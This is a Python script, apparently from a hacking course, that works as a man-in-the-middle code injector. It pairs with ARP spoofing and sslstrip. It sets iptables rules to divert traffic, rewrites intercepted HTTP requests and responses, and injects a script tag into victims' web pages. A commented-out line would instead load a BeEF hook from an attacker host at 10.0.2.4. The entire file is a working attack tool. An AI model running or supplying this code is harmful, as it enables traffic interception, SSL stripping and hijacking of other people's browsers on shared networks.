#!/usr/bin/env python
import re
import subprocess
import netfilterqueue
import scapy.all as scapy


# In Terminal: start arp spoofing tool of choice
# second terminal window run sslstrip
# if only http sites change port 10000 to 80 and comment out subprocess bellow that forwards packets to port 10000

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print "[+] Request"
            print scapy_packet.show()
            load = re.sub("Accept-Encoding: .*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 10000:
            print "[+] Response"
            # print scapy_packet.show()
            # payload = '<script src="http://10.0.2.4:3000/hook.js"></script>'
            payload = '<script>alert("Hacked!");</script>'
            load = load.replace("</body>", payload + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(payload)
                load = load.replace(content_length, str(new_content_length))
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    queue.run()
    subprocess.Popen("sslstrip", shell=True)
except KeyboardInterrupt:
    print "\n[+] Detected 'ctrl + c' ... Flushing iptables"
    subprocess.call(["iptables", "--flush"])
    print "iptables have been cleared"
